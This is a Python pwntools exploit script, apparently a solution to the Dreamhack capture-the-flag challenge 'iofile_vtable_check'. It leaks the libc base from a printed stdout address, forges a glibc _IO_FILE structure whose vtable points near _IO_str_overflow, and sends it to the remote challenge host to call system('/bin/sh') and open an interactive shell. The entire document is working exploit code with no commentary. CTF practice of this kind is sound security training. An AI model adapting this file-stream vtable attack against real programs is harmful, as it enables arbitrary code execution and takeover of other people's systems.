from pwn import * 

# p = process("./iofile_vtable_check")
p = remote("host1.dreamhack.games",8491)

stdout_offset = 0x3ec760 
bin_offset = 0x1b3e9a
system_offset = 0x4f440
jump_offset = 0x3e7ef8  #_IO_str_overflow

ru = lambda x: p.recvuntil(x)
rcv = lambda x: p.recv(x)
sl = lambda x: p.sendline(x)
ps = lambda : pause()
sa = lambda x,y: p.sendlineafter(x,y)

# IO_file structure
def pack_file(_flags = 0, 
             _IO_read_ptr = 0,
             _IO_read_end = 0,
             _IO_read_base = 0,
             _IO_write_base = 0,
             _IO_write_ptr = 0,
             _IO_write_end = 0,
             _IO_buf_base = 0,
             _IO_buf_end = 0,
             _IO_save_base = 0,
             _IO_backup_base = 0,
             _IO_save_end = 0,
             _IO_marker = 0,
             _IO_chain = 0,
             _fileno = 0,
             _lock = 0,
             _IO_codecvt1=0,
             _IO_codecvt2=0,
             _IO_wide_data=0,
             ):
    struct = p32(_flags) + \
            p32(0) + \
            p64(_IO_read_ptr) + \
            p64(_IO_read_end) + \
            p64(_IO_read_base) + \
            p64(_IO_write_base) + \
            p64(_IO_write_ptr) + \
            p64(_IO_write_end) + \
            p64(_IO_buf_base) + \
            p64(_IO_buf_end) + \
            p64(_IO_save_base) + \
            p64(_IO_backup_base) + \
            p64(_IO_save_end) + \
            p64(_IO_marker) + \
            p64(_IO_chain) + \
            p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct += p64(0)
    struct += p64(_IO_codecvt1)
    struct += p64(_IO_wide_data)
    struct += p64(_IO_codecvt2)
    struct += p64(0)*2
    struct += p64(0)
    struct = struct.ljust(0xd8, "\x00")
    return struct
   
ru("stdout: ")

libc_base = int(p.recvline()[:-1],16)-stdout_offset
system = libc_base + system_offset
binsh = libc_base + bin_offset
vtable = libc_base + jump_offset - 0x18
target = (binsh - 100) / 2

log.info(hex(libc_base))

payload = pack_file(_flags=0x0,
                    _IO_buf_base=0,_IO_write_base=0,
                    _IO_write_ptr=target+1,_IO_buf_end=target,
                    )
payload += p64(vtable)
payload += p64(system)

log.info(len(payload))
ps()
sa("Data:",payload)
p.interactive()

